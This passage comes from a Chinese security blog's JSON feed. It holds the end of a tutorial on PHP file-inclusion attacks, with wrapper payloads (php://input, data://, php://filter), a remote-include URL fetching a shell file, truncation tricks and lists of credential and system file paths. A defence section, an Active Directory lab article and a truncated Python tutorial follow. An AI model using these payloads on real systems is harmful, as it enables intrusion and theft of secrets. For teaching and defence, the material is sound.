访问和文件传输。</li>\n</ul>\n<ol>\n<li>rar://:</li>\n</ol>\n<ul>\n<li>用于处理 RAR 文件。</li>\n</ul>\n<ol>\n<li>ogg://:</li>\n</ol>\n<ul>\n<li>用于处理音频流，特别是 Ogg Vorbis 音频文件。</li>\n</ul>\n<ol>\n<li>expect://:</li>\n</ol>\n<ul>\n<li>\n<p>用于处理交互式流，通常用于自动化脚本。</p>\n</li>\n<li>\n<h3 id=\"phpini设置\"><a class=\"markdownIt-Anchor\" href=\"#phpini设置\">#</a> php.ini 设置</h3>\n<p>allow_url_fopen 和 allow_url_include 是 PHP 配置选项，用于控制是否允许在代码中访问远程资源和包含远程文件。这两个选项与安全性有关，因为它们可以影响应用程序的安全性。下面分别介绍这两个选项：</p>\n<ol>\n<li>allow_url_fopen:</li>\n</ol>\n<ul>\n<li>allow_url_fopen 是一个 PHP 配置选项，用于控制是否允许通过 fopen () 函数或其他文件处理函数来访问远程资源。如果这个选项被启用（设置为 1），PHP 允许在代码中使用类似 fopen (“<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tL3Jlc291cmNl\">http://example.com/resource</span>”, “r”) 的方式打开远程 URL，并读取它们的内容。如果禁用（设置为 0），PHP 将不允许这样的操作。\n<ul>\n<li>需要小心，因为启用 allow_url_fopen 可能会导致安全风险，特别是在处理用户提供的 URL 时。攻击者可能尝试包含恶意远程文件或执行恶意代码，从而引发安全问题。</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>allow_url_include:</li>\n</ol>\n<ul>\n<li>\n<p>allow_url_include 是另一个 PHP 配置选项，它控制是否允许通过 include 和 require 函数包含远程文件，如 include “<span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29tL21hbGljaW91cy5waHA=\">http://example.com/malicious.php</span>”;。如果启用（设置为 1），PHP 允许包含远程文件。如果禁用（设置为 0），PHP 将不允许包含远程文件。</p>\n<ul>\n<li>启用 allow_url_include 可能会引发安全风险，因为攻击者可以尝试包含远程恶意代码.</li>\n</ul>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/12.png\" alt=\"\"></p>\n<h3 id=\"协议用法\"><a class=\"markdownIt-Anchor\" href=\"#协议用法\">#</a> 协议用法</h3>\n<h4 id=\"phpinput\"><a class=\"markdownIt-Anchor\" href=\"#phpinput\">#</a> php://input</h4>\n<ol>\n<li>php.ini 条件是 allow_url_fopen =ON allow_url_include=ON</li>\n<li>遇到 file_get_contents () 要想到用 php://input 绕过</li>\n<li>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input, 同时 post 想设置的文件内容，php 执行时会将 post 内容当作文件内容。从而导致任意代码执行。</li>\n<li>比如写<?php phpinfo();?> 或者写一句话？file=php://input POST: 需要写入的数据</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/13.png\" alt=\"\"></p>\n<h4 id=\"phpfile\"><a class=\"markdownIt-Anchor\" href=\"#phpfile\">#</a> php://file</h4>\n<ol>\n<li>用它来本地包含读取本地敏感文件比如 file:///etc/passwd</li>\n<li>读取相对路径 php?file=…/…/php.ini</li>\n</ol>\n<h4 id=\"phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#phpfilter\">#</a> php://filter</h4>\n<ol>\n<li>\n<p>php://filter/convert.base64-encode/resource = 文件路径 base64 读取读取后 base 解码得到源码</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/14.png\" alt=\"\"></p>\n</li>\n<li>\n<p>解码得到 admin password</p>\n</li>\n</ol>\n<h4 id=\"zip\"><a class=\"markdownIt-Anchor\" href=\"#zip\">#</a> zip://</h4>\n<ol>\n<li>\n<p>用于访问对应的压缩文件子文件但是要绝对路径 zip 文件跟子文件要用# %23 分割， 只需要是 zip 的压缩包即可，后缀名可以任意更改</p>\n</li>\n<li>\n<p>相同的类型还有 zlib:// 和 bzip2://</p>\n</li>\n<li>\n<p>利用 page=zip://D:\\Everydaytools\\phpstudy_pro\\WWW\\www.dvwa.com\\vulnerabilities\\123.zip%23123.txt</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/15.png\" alt=\"\"></p>\n</li>\n<li>\n<p>得到 123.zip 里面的 123.txt</p>\n</li>\n</ol>\n<h4 id=\"data协议\"><a class=\"markdownIt-Anchor\" href=\"#data协议\">#</a> data:// 协议</h4>\n<ol>\n<li>\n<p>类似与 php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。从而导致任意代码执行。</p>\n</li>\n<li>\n<p>?page=data://text/plain,<?php phpinfo();?>或者用 baes64 编码后？page=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/16.png\" alt=\"\"></p>\n</li>\n</ol>\n<h3 id=\"文件包含常用路径\"><a class=\"markdownIt-Anchor\" href=\"#文件包含常用路径\">#</a> 文件包含常用路径</h3>\n<h4 id=\"日志文件\"><a class=\"markdownIt-Anchor\" href=\"#日志文件\">#</a> 日志文件</h4>\n<ol>\n<li>/usr/local/apache2/logs/access_log</li>\n<li>/logs/access_log</li>\n<li>/etc/httpd/logs/access_log</li>\n<li>/var/log/httpd/access_log</li>\n<li>/var/log/nginx/access.log</li>\n<li>/var/log/nginx/error.log</li>\n<li>$CATALINA_BASE/logs/access_log</li>\n<li>$CATALINA_BASE/logs/catalina.out</li>\n</ol>\n<h4 id=\"网站配置文件\"><a class=\"markdownIt-Anchor\" href=\"#网站配置文件\">#</a> 网站配置文件</h4>\n<ol>\n<li>dedecms-- data/common.inc.php,</li>\n<li>discuz 全–config/config_global.php,</li>\n<li>phpcms–caches/configs/database.php</li>\n<li>phpwind- -conf/database.php</li>\n<li>wordpress-- wp-config.php</li>\n</ol>\n<h4 id=\"系统配置文件\"><a class=\"markdownIt-Anchor\" href=\"#系统配置文件\">#</a> 系统配置文件</h4>\n<p>linux</p>\n<p>/root/.ssh/authorized_keys</p>\n<p>/root/.ssh/id_rsa</p>\n<p>/root/.ssh/id_ras.keystore</p>\n<p>/root/.ssh/known_hosts</p>\n<p>/etc/passwd</p>\n<p>/etc/shadow</p>\n<p>/etc/my.cnf</p>\n<p>/etc/httpd/conf/httpd.conf</p>\n<p>/root/.bash_history</p>\n<p>/root/.mysql_history</p>\n<p>/proc/self/fd/fd [0-9]*(文件标识符)</p>\n<p>/proc/mounts</p>\n<p>/porc/config.gz</p>\n<p>win</p>\n<p>C:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置</p>\n<p>C:/Windows/repairsam// 初次安装的密码</p>\n<p>C:/Program Files/mysql/my.ini//Mysql 配置</p>\n<p>C:/Program Files/mysql/data/mysql/user.MYD//Mysql root</p>\n<p>C:/Windows/php.ini//php 配置</p>\n<p>C:/Windows/my.ini//Mysql 配置</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"远程文件包含\"><a class=\"markdownIt-Anchor\" href=\"#远程文件包含\">#</a> 远程文件包含</h3>\n<ol>\n<li>当远程文件开启时，可以包含远程文件到本地执行。当 allow_url_fopen=On allow_url_include=ON 两个条件同时为 On 允许远程包含文件。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xMDMvbGZpLnBocD9maWxlPWh0dHA6Ly8xOTIuMTY4LjAuMTAzL3NoZWxsLnR4dA==\">http://192.168.0.103/lfi.php?file=http://xxx.xxx.xxx.xxx/shell.txt</span> xxx.xxx.xxx.xxx 设置为远程的 ip</li>\n</ol>\n<h3 id=\"文件包含截断\"><a class=\"markdownIt-Anchor\" href=\"#文件包含截断\">#</a> 文件包含截断</h3>\n<h4 id=\"00截断\"><a class=\"markdownIt-Anchor\" href=\"#00截断\">#</a> %00 截断</h4>\n<ol>\n<li>php 版本要低于 5.3.4 使用 include 等文件包含函数，可以截断文件名，但是会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成 \\0 截断会失败。</li>\n</ol>\n<h4 id=\"超长文件包含截断\"><a class=\"markdownIt-Anchor\" href=\"#超长文件包含截断\">#</a> 超长文件包含截断</h4>\n<ol>\n<li>合适于 win32 可以使用。进行截断 和 .(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256) 利用操作系统对目录最大长度限制。在 window 下 256 字节 linux 下 4096 字节</li>\n</ol>\n<h4 id=\"点截断\"><a class=\"markdownIt-Anchor\" href=\"#点截断\">#</a> 点截断</h4>\n<ol>\n<li>php?file=x.jpg…</li>\n</ol>\n<h4 id=\"截断\"><a class=\"markdownIt-Anchor\" href=\"#截断\">#</a> /. 截断</h4>\n<ol>\n<li>php?file=shell.png%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e</li>\n</ol>\n<h4 id=\"远程包含截断\"><a class=\"markdownIt-Anchor\" href=\"#远程包含截断\">#</a> 远程包含截断</h4>\n<ol>\n<li>?url=%3f</li>\n<li>00url=%00</li>\n<li>#url=%23</li>\n</ol>\n<h3 id=\"防御\"><a class=\"markdownIt-Anchor\" href=\"#防御\">#</a> 防御</h3>\n<ol>\n<li>输入验证和过滤：</li>\n</ol>\n<ul>\n<li>对用户提供的输入进行验证和过滤，确保用户输入不包含恶意数据。</li>\n<li>使用白名单控制，只允许应用程序需要的文件和目录被包含。</li>\n</ul>\n<ol>\n<li>使用白名单控制：</li>\n</ol>\n<ul>\n<li>确保只有可信的文件和目录被包含。不要从用户提供的数据中构建文件路径。</li>\n<li>限制包含文件的目录，只允许访问应用程序需要的文件和目录。</li>\n</ul>\n<ol>\n<li>避免直接用户输入：</li>\n</ol>\n<ul>\n<li>不要直接将用户输入用作包含文件的路径。如果必须使用用户提供的输入，确保对其进行严格的过滤和验证</li>\n<li>使用安全的文件包含函数，如 include () 和 require ()，而不是不安全的函数，如 include_once () 和 require_once ()。</li>\n</ul>\n<ol>\n<li>文件权限：</li>\n</ol>\n<ul>\n<li>设置适当的文件和目录权限，以确保只有授权的用户可以访问和执行文件。</li>\n<li>避免将敏感文件放在 Web 根目录下，以减少可能的攻击面。</li>\n</ul>\n<ol>\n<li>配置安全：</li>\n</ol>\n<ul>\n<li>配置 Web 服务器和应用程序框架以最小化攻击面。</li>\n<li>禁用不必要的文件包含功能，如 allow_url_fopen 和 allow_url_include，以防止包含远程文件。</li>\n</ul>\n<ol>\n<li>监控和日志：</li>\n</ol>\n<ul>\n<li>实施监控和日志功能，以及时检测和响应潜在的文件包含攻击。</li>\n</ul>\n<ol>\n<li>安全开发实践：</li>\n</ol>\n<ul>\n<li>培训开发人员，使他们了解文件包含漏洞和其他常见 Web 应用程序漏洞。</li>\n<li>使用安全编程技术，如输出编码和防止 SQL 注入，以加强应用程序的整体安全性。</li>\n</ul>\n<ol>\n<li>安全扫描：</li>\n</ol>\n<ul>\n<li>定期进行安全扫描和渗透测试，以识别和修复文件包含漏洞以及其他潜在的漏洞。</li>\n</ul>\n<p>综上所述，文件包含漏洞的防御需要综合使用多种方法，包括输入验证、白名单控制、文件权限管理、安全配置和教育开发人员等措施。这些措施有助于降低文件包含漏洞对应用程序的风险。</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/",
            "url": "http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/",
            "title": "域环境",
            "date_published": "2023-10-30T04:00:34.000Z",
            "content_html": "<h3 id=\"域\"><a class=\"markdownIt-Anchor\" href=\"#域\">#</a> 域</h3>\n<p>在计算机网络中，<strong>域环境</strong>是一种组织资源和用户的方式，它允许集中管理和控制网络中的各种对象。</p>\n<ol>\n<li><strong>域（Domain）</strong>：\n<ul>\n<li>域是一个逻辑上分组的计算机、用户和设备集合，它们共享一个安全边界和一组共同的策略。</li>\n<li>域的边界通常由网络协议、安全策略和域控制器来定义。</li>\n<li>域提供了集中式的管理和认证，使得网络资源的访问和管理更加方便和安全。</li>\n</ul>\n</li>\n<li><strong>域控制器（Domain Controller）</strong>：\n<ul>\n<li>域控制器是域环境中的核心组件，负责管理域中的安全认证和授权、用户账户和计算机账户的管理。</li>\n<li>它运行特定的服务，如活动目录服务（Active Directory Service）。</li>\n<li>域控制器保存了域中的用户、组、计算机等对象的信息，并提供身份验证和授权服务。</li>\n</ul>\n</li>\n<li><strong>活动目录（Active Directory）</strong>：\n<ul>\n<li>活动目录是一种目录服务，用于在网络环境中存储、组织和提供对网络资源的访问。</li>\n<li>它包含了域内所有对象的信息，如用户、组、计算机等，并提供了一种层次结构来组织这些对象。</li>\n<li>活动目录允许管理员通过分配权限和策略来控制用户对资源的访问和使用。</li>\n<li><strong>集中式身份验证和授权</strong>：\n<ul>\n<li>活动目录允许用户通过单一的登录认证来访问网络上的各种资源，无论是文件共享、打印机、电子邮件等。</li>\n<li>用户登录后，活动目录负责验证其身份，并根据其权限授予对资源的访问权限。</li>\n</ul>\n</li>\n<li><strong>集中式资源管理</strong>：\n<ul>\n<li>活动目录可以存储和管理网络中的各种资源，包括用户账户、计算机账户、组、文件共享、打印机等。</li>\n<li>管理员可以使用活动目录管理工具对这些资源进行组织、分配权限、设置策略等操作。</li>\n</ul>\n</li>\n<li><strong>层次结构组织</strong>：\n<ul>\n<li>活动目录使用层次结构来组织网络资源和用户信息，这种层次结构称为目录树或者域树。</li>\n<li>目录树由各种对象组成，包括域、组织单位（OU）、容器、用户、计算机等，这些对象可以按照管理员的需求进行组织和管理。</li>\n</ul>\n</li>\n<li><strong>灵活的安全模型</strong>：\n<ul>\n<li>活动目录提供了灵活的安全模型，可以根据组织的需求来设置不同级别的安全策略和权限控制。</li>\n<li>管理员可以通过活动目录设置用户访问权限、密码策略、帐户锁定策略、加密选项等，以确保网络安全。</li>\n</ul>\n</li>\n<li><strong>集中式管理工具</strong>：\n<ul>\n<li>微软提供了各种管理工具，如 “活动目录用户和计算机”、“组策略管理编辑器” 等，用于管理和配置活动目录环境。</li>\n<li>这些工具提供了用户界面和命令行界面，可以用于执行各种管理任务，如创建用户、组织单位、设置组策略等。</li>\n</ul>\n</li>\n<li><strong>复制和同步</strong>：\n<ul>\n<li>活动目录支持在多个域控制器之间进行复制和同步，以确保数据的一致性和可用性。</li>\n<li>当有新的数据或者更改发生时，活动目录会自动将这些变更复制到其他域控制器，以保持整个活动目录环境的同步。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>域成员（Domain Member）</strong>：\n<ul>\n<li>域成员是加入域的计算机或设备，它们受到域控制器的管理。</li>\n<li>加入域后，域成员可以通过活动目录中的账户进行身份验证，并且可以访问域中共享的资源。</li>\n</ul>\n</li>\n<li><strong>组策略（Group Policy）</strong>：\n<ul>\n<li>组策略是一种管理工具，用于在域环境中配置和管理用户和计算机的操作系统和应用程序设置。</li>\n<li>管理员可以通过组策略向域中的用户和计算机分配特定的设置和权限，以实现统一的管理和安全策略。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"常见的域环境\"><a class=\"markdownIt-Anchor\" href=\"#常见的域环境\">#</a> 常见的域环境</h3>\n<ol>\n<li><strong>单域</strong>：在一个地理位置固定的小公司中，建立一个域通常就可以满足需求。在一个域内，至少需要两台域服务器，一台作为<strong>域控制器</strong>（Domain Controller，DC），另一台作为备份 DC。</li>\n<li><strong>父域和子域</strong>：出于管理和其他需求，需要在网络中划分多个域。第一个域称为<strong>父域</strong>，各分部的域称为该域的<strong>子域</strong>。</li>\n<li><strong>域树</strong>：域树是多个域通过建立信任关系组成的集合。在域树内，父域和子域可以相互管理，并跨网络分配文件、打印机等设备和资源。</li>\n<li><strong>域森林</strong>：域森林是指多个域树通过建立信任关系的集合。域森林允许不同域之间实现资源共享、管理、通信和数据传输。</li>\n<li><strong>活动目录</strong>（Active Directory，AD）：活动目录是域环境中提供目录服务的组件。它是微软提供的统一管理基础的平台，用于集中管理账号、软件、环境和增强安全性。</li>\n</ol>\n<h3 id=\"域内权限\"><a class=\"markdownIt-Anchor\" href=\"#域内权限\">#</a> 域内权限</h3>\n<ol>\n<li>\n<p><strong>安全组（Security Group）</strong>：</p>\n<ul>\n<li>安全组用于管理对资源的访问权限。</li>\n<li>可以将用户或计算机添加到安全组中，从而授予他们访问某些资源的权限。</li>\n<li>安全组的权限可以直接应用于文件夹、共享文件夹、打印机等资源，或者通过组策略应用于计算机。</li>\n</ul>\n</li>\n<li>\n<p><strong>分发组（Distribution Group）</strong>：</p>\n<ul>\n<li>分发组用于向一组用户或计算机发送邮件。</li>\n<li>分发组通常用于群发邮件、通知、公告等目的，而不涉及访问资源的权限管理。</li>\n<li>分发组的成员可以收到组发的邮件，但不会获得访问资源的权限。</li>\n</ul>\n</li>\n<li>\n<p><strong>域本地组（Domain Local Group）</strong>：</p>\n<ul>\n<li>域本地组是一种在单个域内使用的组，用于管理对资源的访问权限。</li>\n<li>可以将用户、全局组或其他域本地组添加到域本地组中，并为该组分配访问资源的权限。</li>\n<li>域本地组的权限范围局限于单个域内，不会跨域生效。</li>\n</ul>\n</li>\n<li>\n<p><strong>全局组（Global Group）</strong>：</p>\n<ul>\n<li>全局组用于组织和管理用户和计算机。</li>\n<li>可以将用户添加到全局组中，然后将全局组添加到安全组或域本地组中，从而为他们分配访问资源的权限。</li>\n<li>全局组的权限范围跨越整个域，适用于跨域资源访问的权限管理。</li>\n</ul>\n</li>\n<li>\n<p><strong>通用组（Universal Group）</strong>：</p>\n<ul>\n<li>通用组是一种特殊类型的组，可以跨域使用。</li>\n<li>可以将全局组、域本地组或其他通用组添加到通用组中，从而创建具有跨域权限的组。</li>\n<li>通用组通常用于复杂的跨域资源访问场景，如多域架构或跨域信任环境下的权限管理。</li>\n</ul>\n<h3 id=\"域环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#域环境搭建\">#</a> 域环境搭建</h3>\n<p>winservser12-ad 10.10.10.137</p>\n<p>winserver12 10.10.10.12</p>\n<p>12ad 安装 Active Directory 域服务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303161445246.png\" alt=\"image-20240303161445246\"></p>\n</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162103134.png\" alt=\"image-20240303162103134\"></p>\n<p>点击将此服务器提升为域控制器</p>\n<p>创建一个新林</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162255653.png\" alt=\"image-20240303162255653\"></p>\n<p>创建密码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162407087.png\" alt=\"image-20240303162407087\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303162608011.png\" alt=\"image-20240303162608011\"></p>\n<p>重启后显示 YUNYI 输入设置的密码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163345745.png\" alt=\"image-20240303163345745\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163434498.png\" alt=\"image-20240303163434498\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303163503532.png\" alt=\"image-20240303163503532\"></p>\n<p>创建成功，创建一个新用户 test12</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170230723.png\" alt=\"image-20240303170230723\"></p>\n<p>接着把 12servser4 的 dns 设置成 ad 的 ip</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170514382.png\" alt=\"image-20240303170514382\"></p>\n<p>设置隶属于 yunyi.io 输入刚才创建的用户 test12 然后重启</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170622943.png\" alt=\"image-20240303170622943\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303170725741.png\" alt=\"image-20240303170725741\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303171037565.png\" alt=\"image-20240303171037565\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240303171338213.png\" alt=\"image-20240303171338213\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/python%E5%BE%AA%E7%8E%AF/python%E5%BE%AA%E7%8E%AF/",
            "url": "http://gyzero.shop/2023/10/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/python%E5%BE%AA%E7%8E%AF/python%E5%BE%AA%E7%8E%AF/",
            "title": "python循环判断",
            "date_published": "2023-10-30T03:44:45.000Z",
            "content_html": "<p>判断语句和循环语句</p>\n<p><strong>if</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span>语句</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>格式如下</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> 判断条件<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    条件成立要做的事情</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>demo1</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>age <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'输入年龄:'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> 接收输入的年龄赋值给age</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"判断开始\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> age <span class=\"token operator\">></span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"恭喜18进入游戏\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"判断结束\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    输入年龄<span class=\"token punctuation\">:</span><span class=\"token number\">18</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    判断开始</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    恭喜<span class=\"token number\">18</span>进入游戏</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    判断结束</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>demo2</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span> age <span class=\"token operator\">&lt;</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"未满18不可进入\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    输入年龄<span class=\"token punctuation\">:</span><span class=\"token number\">17</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    判断开始</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    未满<span class=\"token number\">18</span>不可进入</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    判断结束</pre></td></tr></table></figure><p><strong>if —else</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> 条件<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        满足条件时要做的事情<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        满足条件时要做的事情<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        满足条件时要做的事情<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>省略<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        不满足条件时要做的事情<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        不满足条件时要做的事情<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        不满足条件时要做的事情<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>省略<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>demo1</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>age <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入年龄:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始判断\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> age <span class=\"token operator\">></span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"恭喜满18可以游玩\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"条件未满足跳到这里\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 